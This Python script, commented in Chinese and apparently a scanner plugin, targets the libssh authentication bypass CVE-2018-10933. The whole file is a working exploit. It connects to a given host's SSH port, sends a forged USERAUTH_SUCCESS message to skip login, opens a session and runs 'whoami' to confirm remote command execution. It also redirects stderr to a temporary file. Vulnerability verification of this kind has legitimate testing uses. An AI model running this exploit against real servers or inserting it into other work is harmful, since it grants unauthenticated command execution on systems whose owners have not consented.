#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: libssh身份绕过漏洞(CVE-2018-10933)
referer: https://www.anquanke.com/post/id/162225
author: from https://github.com/blacknbunny/libSSH-Authentication-Bypass
env source:https://github.com/vulhub/vulhub/blob/master/libssh/CVE-2018-10933/README.zh-cn.md
description: 漏洞源于未经过验证的session操纵SSH2_MSG_USERAUTH_SUCCESS导致的身份验证绕过。
'''
import sys
import socket
import paramiko
import warnings
import tempfile,sys
from termcolor import cprint
from urllib.parse import urlparse

sys.stderr=tempfile.TemporaryFile()

class libssh_bypass_auth_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        port = 22
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            host = self.url

        try:
            sock = socket.socket()
            sock.connect((host, port))
            message = paramiko.message.Message()
            transport = paramiko.transport.Transport(sock)
            transport.start_client()
            message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
            transport._send_message(message)
            cprint("[*]发现"+host+":"+str(port)+" 版本:"+transport.remote_version, "green")
            spawncmd = transport.open_session(timeout=10)
            spawncmd.exec_command("whoami")
            if spawncmd.recv_exit_status() == 0:
                cprint("[+]存在libssh身份绕过漏洞...(高危)\tpayload: "+host+":"+str(port), "red")
        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = libssh_bypass_auth_BaseVerify(sys.argv[1])
    testVuln.run()